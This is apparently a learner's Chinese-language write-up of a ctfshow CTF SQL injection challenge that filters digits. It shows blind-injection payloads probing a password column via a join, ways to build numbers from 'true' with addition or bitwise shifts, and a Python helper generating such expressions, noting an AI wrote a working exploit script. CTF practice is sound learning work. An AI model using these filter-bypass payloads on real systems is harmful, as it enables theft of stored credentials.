#true累加
这道题连数字都过滤了，是[[ctfshow184sql过滤与爆破]]的升级版
![[Pasted image 20260411195946.png]]
但是实际上核心思想也很简单，就是用true累加来完成绕过
- 不能用数字？2=true+true
- 不能用引号？true不需要引号

但是我通过 `tableName=ctfshow_user a right join ctfshow_user b on ascii(substr(b.pass,true,true))>(true+true)` 发现，本题入口可能把+处理为空格，所以我们还需要深入研究一下看看别的绕过方式。
>  方法2：（看题解，似乎只要把 `+` 给进行url编码后( `%2B`)丢给服务器，这样仍然能用(requests库会自动对POST进行url编码)
- 我们发现 `+` 的处理不符合预期后，想到可以用 `<<，>>，|，~` 来实现位运算，总而利用true来构造数字
	- 经过 `tableName=ctfshow_user a right join ctfshow_user b on ascii(substr(b.pass,true,true))>(true<<true)` 探测发现，该方案完全可用。
```
def generate_bitwise_num(n):
    if n == 0:
        return "false" # 或者 (true ^ true)
    if n == 1:
        return "true"
    
    # 找到二进制表示中所有为 1 的位置
    bits = []
    binary_str = bin(n)[:1:-1] # 逆序获取二进制位，例如 6(110) -> 011
    
    for i, bit in enumerate(binary_str):
        if bit == '1':
            if i == 0:
                bits.append("true")
            elif i == 1:
                bits.append("(true << true)")
            else:
                # 递归生成位移的偏移量
                bits.append(f"(true << ({generate_bitwise_num(i)}))")
    
    # 用按位或 | 连接起来
    return " | ".join(bits)

# 测试
target_num = 100
payload = generate_bitwise_num(target_num)
print(f"数字 {target_num} 的表达式为:\n{payload}")
```
AI写的按位计算返回字符串，实现方式还是比我想的要简单，聪明，优雅(叹气)
那核心思路有了，剩下的也就只是稍微搓一下脚本了，不算特别难的事情。
我们让AI从零开始试着解决一下它吧：
![[Pasted image 20260411203012.png]]
答案是在没有表名和字段名，没有任何好用的skill的情况下，它只花了10分钟就做出了可行的脚本。。。
![[Pasted image 20260411210252.png]]
现在学ctf不知道还有多大意义(叹气)